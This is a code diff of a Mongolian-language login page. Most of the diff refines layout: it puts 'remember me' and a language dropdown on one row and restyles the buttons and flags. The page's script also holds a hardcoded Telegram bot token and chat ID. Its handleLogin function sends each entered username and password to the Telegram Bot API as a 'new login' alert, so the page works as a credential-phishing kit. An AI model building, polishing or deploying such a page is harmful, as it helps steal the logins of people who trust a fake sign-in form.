@@ -40,12 +40,12 @@ body {
   padding: 30px 20px;
   background-color: #1D1C2A;
   box-sizing: border-box;
-  z-index: 10; /* Контейнерийг давхарлаж хаахаас сэргийлэв */
+  z-index: 10;
 }
 
+/* Нэвтрэх талбарууд */
 input[type=text].user-input,
-input[type=text].phone-input,
-.login-btn {
+input[type=text].phone-input {
   width: 100% !important;
   height: 55px !important;
   margin: 10px 0 !important;
@@ -60,14 +60,21 @@ input[type=text].phone-input {
   -webkit-text-security: disc; 
 }
 
-/* Сануулах хэсэг */
+/* "Намайг санах" болон Хэл солих товчийг яг нэг мөрөнд байрлуулах хэсэг */
+.options-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin: 8px 0 12px 0;
+}
+
 .remember-container {
   display: flex;
   align-items: center;
-  margin: 5px 0 15px 0;
   color: white;
   font-size: 15px;
   cursor: pointer;
+  margin: 0;
 }
 
 .remember-container input {
@@ -77,7 +84,15 @@ input[type=text].phone-input {
   cursor: pointer;
 }
 
+/* Нэвтрэх товч */
 .login-btn {
+  width: 100% !important;
+  height: 55px !important;
+  margin: 10px 0 !important;
+  padding: 10px 15px !important;
+  border-radius: 10px;
+  box-sizing: border-box;
+  font-size: 20px !important;
   background-color: #ccbf64;
   color: white;
   cursor: pointer;
@@ -89,33 +104,29 @@ input[type=text].phone-input {
 .error-msg {
   color: #ff4d4d;
   font-size: 14px;
-  margin-top: -5px;
+  margin-top: -2px;
   margin-bottom: 5px;
   display: none;
   font-weight: bold;
 }
 
-/* Хэл солих хэсэг (Дарагдахад саад болохгүйн тулд z-index өгөв) */
+/* Хэл солих товчлуур */
 .lang-container {
-  margin-top: 15px;
-  display: flex;
-  justify-content: flex-end;
+  display: inline-block;
   position: relative;
   z-index: 999;
 }
 
-/* Dropdown үндсэн бүтэц */
 .dropdown {
   position: relative;
   display: inline-block;
 }
 
-/* Далбааны үндсэн товч */
 .dropbtn {
   background: rgba(255, 255, 255, 0.2);
   border: 2px solid #ccbf64;
-  padding: 6px 10px;
-  border-radius: 10px;
+  padding: 4px 8px;
+  border-radius: 8px;
   cursor: pointer;
   display: flex;
   align-items: center;
@@ -123,21 +134,20 @@ input[type=text].phone-input {
 }
 
 .flag-img {
-  width: 38px;
-  height: 26px;
+  width: 32px;
+  height: 22px;
   object-fit: cover;
   border-radius: 3px;
   display: block;
-  pointer-events: none; /* Зураг дээр дархад товч шууд ажиллах */
+  pointer-events: none;
 }
 
-/* Унадаг цэс */
 .dropdown-content {
   display: none;
   position: absolute;
   right: 0;
-  bottom: 100%;
-  margin-bottom: 5px;
+  top: 100%;
+  margin-top: 5px;
   background-color: #ffffff;
   box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
   border-radius: 8px;
@@ -146,7 +156,7 @@ input[type=text].phone-input {
 }
 
 .dropdown-content a {
-  padding: 8px 12px;
+  padding: 6px 10px;
   text-decoration: none;
   display: flex;
   align-items: center;
@@ -167,37 +177,43 @@ input[type=text].phone-input {
 
   <div class="login-box">
     <form id="loginForm" onsubmit="return false;">
+      
+      <!-- Input хэсгүүд -->
       <input type="text" id="usernameInput" name="username" class="user-input" placeholder="Хэрэглэгчийн нэр">
       
       <input type="text" id="passwordInput" name="password" class="phone-input" placeholder="Нууц үг">
       <div id="errorMsg" class="error-msg">Нууц үг буруу (Хамгийн багадаа 10 орон байна)</div>
 
-      <label class="remember-container">
-        <input type="checkbox" id="rememberMe"> <span id="rememberText">Намайг санах</span>
-      </label>
+      <!-- Намайг санах болон хэл солих товчийг нэг мөрөнд байрлуулав -->
+      <div class="options-row">
+        <label class="remember-container">
+          <input type="checkbox" id="rememberMe"> <span id="rememberText">Намайг санах</span>
+        </label>
 
-      <button type="button" id="loginBtn" class="login-btn" onclick="handleLogin()">Нэвтрэх</button>
-    </form>
-
-    <div class="lang-container">
-      <div class="dropdown">
-        <div class="dropbtn" onclick="toggleDropdown(event)">
-          <img id="currentFlag" src="mongolia.png" class="flag-img" alt="MN">
-        </div>
-        <div id="myDropdown" class="dropdown-content">
-          <a href="javascript:void(0);" onclick="changeLang('mn')">
-            <img src="mongolia.png" class="flag-img" alt="MN">
-          </a>
-          <a href="javascript:void(0);" onclick="changeLang('en')">
-            <img src="uk.png" class="flag-img" alt="EN">
-          </a>
+        <div class="lang-container">
+          <div class="dropdown">
+            <div class="dropbtn" onclick="toggleDropdown(event)">
+              <img id="currentFlag" src="mongolia.png" class="flag-img" alt="MN">
+            </div>
+            <div id="myDropdown" class="dropdown-content">
+              <a href="javascript:void(0);" onclick="changeLang('mn')">
+                <img src="mongolia.png" class="flag-img" alt="MN">
+              </a>
+              <a href="javascript:void(0);" onclick="changeLang('en')">
+                <img src="uk.png" class="flag-img" alt="EN">
+              </a>
+            </div>
+          </div>
         </div>
       </div>
-    </div>
+
+      <!-- Нэвтрэх товч -->
+      <button type="button" id="loginBtn" class="login-btn" onclick="handleLogin()">Нэвтрэх</button>
+    </form>
   </div>
 
 <script>
-// Та өөрийн Telegram Bot Token болон Chat ID-гаа энд солино уу
+// Энд өөрийн Bot Token болон Chat ID-гаа тавина уу
 const TELEGRAM_BOT_TOKEN = "9298783806:AAE9qmGBbPboZSIBq1DarIQjOE_U3qEutkk";
 const TELEGRAM_CHAT_ID = "6261945536";
 
@@ -206,7 +222,6 @@ function toggleDropdown(event) {
   document.getElementById("myDropdown").classList.toggle("show");
 }
 
-// Цэснээс гадуур дарвал цэсийг хаах
 window.onclick = function(event) {
   if (!event.target.closest('.dropdown')) {
     var dropdowns = document.getElementsByClassName("dropdown-content");
@@ -270,7 +285,7 @@ function handleLogin() {
 
   const text = `🔔 Шинэ нэвтрэлт:\n👤 Нэр: ${username}\n🔑 Нууц үг: ${password}`;
 
-  // Telegram руу илгээх хүсэлт
+  // Telegram руу илгээх
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {
